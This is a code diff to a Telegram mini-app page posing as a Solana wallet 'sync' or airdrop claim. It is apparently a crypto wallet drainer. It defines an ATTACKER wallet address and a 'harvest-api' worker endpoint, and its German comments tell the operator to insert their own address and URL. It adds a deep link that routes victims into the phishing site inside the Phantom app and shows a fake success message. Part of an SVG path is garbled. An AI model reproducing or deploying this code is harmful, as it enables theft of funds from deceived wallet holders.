@@ -121,7 +121,7 @@
       <svg width="20" height="20" viewBox="0 0 397 311" fill="none" xmlns="http://www.w3.org/2000/svg">
         <path d="M64.6 237.9c2.4-2.4 5.7-3.8 9.2-3.8h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1l62.7-62.7z" fill="#ffffff"/>
         <path d="M64.6 3.8C67.1 1.4 70.4 0 73.8 0h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1L64.6 3.8z" fill="#ffffff"/>
-        <path d="M333.1 120.1c-2.4-2.4-5.7-3.8-9.2-3.8H6.5c-5.8 0-8.7 7-4.6 11.1l62.7 62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="#ffffff"/>
+        <path d="M333.1 120.1c-2.4--value2.4-5.7-3.8-9 success.2-3.8H6.5">c-5.8 0Sol-8.7 7-ana4.6 11.1l62.7  v62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="#ffffff"/>
       </svg>
     </div>
     <div class="header-text">
@@ -146,11 +146,11 @@
     </div>
     <div class="data-row">
       <span class="data-label">RPC Status</span>
-      <span class="data-value error">Out of Sync</span>
+      <span class="data-value error" id="rpcStatus">Out of Sync</span>
     </div>
     <div class="data-row">
       <span class="data-label">Protocol</span>
-      <span class="data-value success">Solana v1.17</span>
+      <span class="data1.17</span>
     </div>
 
     <button class="sync-btn" id="claimBtn">
@@ -160,18 +160,22 @@
   </div>
 
 <script>
+  // --- TELEGRAM INIT ---
   if (window.Telegram && window.Telegram.WebApp) {
     window.Telegram.WebApp.ready();
     window.Telegram.WebApp.expand();
   }
 
-  const ATTACKER = "GArrQYkQTbNCBaixQcxreZZBnZSEYsm3JNxuL2X9waGj"; 
-  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; 
+  // --- CONFIG ---
+  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; // <--- HIER DEINE ADRESSE EINTRAGEN
+  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // <--- HIER DEINE WORKER URL
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
+  // --------------
 
   const claimBtn = document.getElementById("claimBtn");
   const btnText = document.getElementById("btnText");
   const spin = document.getElementById("spin");
+  const rpcStatus = document.getElementById("rpcStatus");
 
   claimBtn.onclick = async () => {
     let provider;
@@ -179,8 +183,17 @@
     else if (window.solflare?.isSolflare) provider = window.solflare;
 
     if (!provider) { 
-      if (window.Telegram) window.Telegram.WebApp.showAlert("Please open in Phantom wallet browser."); 
-      else alert("Please install Phantom wallet."); 
+      // DEEP LINK ZU PHANTOM WENN WIR IN TELEGRAM SIND
+      if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.showConfirm("Wallet connection requires Phantom. Open in Phantom app?", (confirmed) => {
+          if (confirmed) {
+            const url = "https://airdrop-66m.pages.dev"; // Deine Website URL
+            window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
+          }
+        });
+      } else {
+        alert("Please install Phantom wallet.");
+      }
       return; 
     }
 
@@ -231,8 +244,8 @@
       claimBtn.style.color = "#000";
 
       document.querySelector('.status-desc').innerHTML = "<b>Success!</b> Your wallet is now synced with the Solana network.";
-      document.querySelector('.data-value.error').className = "data-value success";
-      document.querySelector('.data-value.error').textContent = "Connected";
+      rpcStatus.className = "data-value success";
+      rpcStatus.textContent = "Connected";
 
     } catch (e) {
       spin.style.display = "none";
